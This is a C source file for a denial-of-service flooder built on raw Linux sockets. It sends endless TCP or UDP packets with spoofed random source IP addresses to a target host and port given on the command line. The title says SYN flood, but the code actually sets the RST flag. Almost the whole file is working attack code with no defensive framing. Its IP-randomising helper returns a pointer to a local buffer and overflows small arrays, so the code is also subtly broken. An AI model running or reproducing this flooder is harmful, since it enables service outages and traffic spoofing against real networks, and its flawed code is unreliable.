/*
	Syn Flood DOS with LINUX sockets
*/
#include <time.h>
#include <stdlib.h>
#include<stdio.h>
#include<string.h> //memset
#include<sys/socket.h>
#include<stdlib.h> //for exit(0);
#include<errno.h> //For errno - the error number
#include<netinet/tcp.h>	//Provides declarations for tcp header
#include<netinet/udp.h>	//Provides declarations for udp header
#include<netinet/ip.h>	//Provides declarations for ip header
char * iprand();
struct pseudo_header_udp
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t udp_length;
};
struct pseudo_header    //needed for checksum calculation
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;

	struct tcphdr tcp;
};

unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((unsigned char*)&oddbyte)=*(unsigned char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

int main (int argc, char **argv)
{
	char * dest="127.0.0.1";
	int port=443;
	char * protocol ="TCP";

  for (int i = 0; i < argc; ++i) {
	char * t ="-t";
if (argc>1){
	int  result1 = strcmp(argv[i], "-t");
	if(result1==0){
		dest =argv[i+1];
	}
int  result2 = strcmp(argv[i], "-p");
	if(result2==0){
		port =  (int) strtol(argv[i+1], NULL, 10);
	}
	int  result3 = strcmp(argv[i], "-r");
	if(result3==0){
		protocol ="UDP";
	}
	
	}
  }
		
srand(time(NULL));
 //  int s=create_socket();
	// //Create a raw socket
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s == -1)
	{
		//socket creation failed, may be because of non-root privileges
		perror("Failed to create raw socket");
		exit(1);
	}
      while (1)
	   {
    
	//Datagram to represent the packet
	char datagram[4096] , source_ip[32], *pseudogram;
	//IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;
	struct pseudo_header_udp psh_udp;


	//UDP header
	struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));
	//char * srciprand=iprand();
	//strcpy(source_ip , "192.168.1.2");
  	strcpy(source_ip , iprand());

	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.s_addr = inet_addr (dest);
	
	memset (datagram, 0, 4096);	/* zero out the buffer */
	
	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	int res=strcmp(protocol, "UDP");
	if(res==0){
		iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr);
		iph->protocol = IPPROTO_UDP;
	}
	else{
	iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	iph->protocol = IPPROTO_TCP;
	}
	iph->id = htons(54321);	//Id of this packet
	iph->frag_off = 0;
	iph->ttl = 255;
	
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

	
	//////////////////////////////////////////////////////////////////////////////
if(res==0){
	//UDP header
	udph->source = htons (1234);
	udph->dest = htons (port);
	udph->len = htons(8); //+ strlen(data));	//tcp header size
	udph->check = 0;	//leave checksum 0 now, filled later by pseudo header
	
	//Now the UDP checksum using the pseudo header
	psh_udp.source_address = inet_addr( source_ip );
	psh_udp.dest_address = sin.sin_addr.s_addr;
	psh_udp.placeholder = 0;
	psh_udp.protocol = IPPROTO_UDP;
	psh_udp.udp_length = htons(sizeof(struct udphdr)); //+ strlen(data) );
	
	int psize = sizeof(struct pseudo_header_udp) + sizeof(struct udphdr); //+ strlen(data);
	pseudogram = malloc(psize);
	
	memcpy(pseudogram , (char*) &psh_udp , sizeof (struct pseudo_header_udp));
	memcpy(pseudogram + sizeof(struct pseudo_header_udp) , udph , sizeof(struct udphdr)); //+ strlen(data));
	
	udph->check = csum( (unsigned short*) pseudogram , psize);
	}
	else{
	//TCP Header
	tcph->source = htons (1234);
	tcph->dest = htons (port);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;		/* first and only tcp segment */
	tcph->fin=0;
	tcph->syn=0;
	tcph->rst=1;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons (5840);	/* maximum allowed window size */
	tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
	tcph->urg_ptr = 0;
	//Now the IP checksum
	
	psh.source_address = inet_addr( source_ip );
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);
	
	memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
	
	tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
	}
	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int one = 1;
	const int *val = &one;
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}
	
	//Uncommend the loop if you want to flood :)
	//    while (1)
	//    {
		// strcpy(source_ip , iprand());
		// iph->saddr = inet_addr ( source_ip );
		
		//Send the packet
		if (sendto (s,		/* our socket */
					datagram,	/* the buffer containing headers and data */
					iph->tot_len,	/* total length of our datagram */
					0,		/* routing flags, normally always 0 */
					(struct sockaddr *) &sin,	/* socket addr, just like in */
					sizeof (sin)) < 0)		/* a normal send() */
		{
			printf ("error\n");
		}
		//Data send successfully
		else
		{
			//printf("%s\n",source_ip);
            printf ("Packet Send from source ip %s \n",source_ip);
		}
	 }
	
	return 0;
}
char * iprand(){
char * s;
char  c1[6];
char  c2[6];
char  c3[6];
char  c4[6];

// srand(time(NULL));
int cnt1=rand()%255;
int cnt2=rand()%255;
int cnt3=rand()%255;
int cnt4=rand()%255;
sprintf(c1,"%d",cnt1);
sprintf(c2,"%d",cnt2);
sprintf(c3,"%d",cnt3);
sprintf(c4,"%d",cnt4);
s=strcat(c1,".");
s=strcat(s,c2);
s=strcat(s,".");
s=strcat(s,c3);
s=strcat(s,".");
s=strcat(s,c4);

return s;
}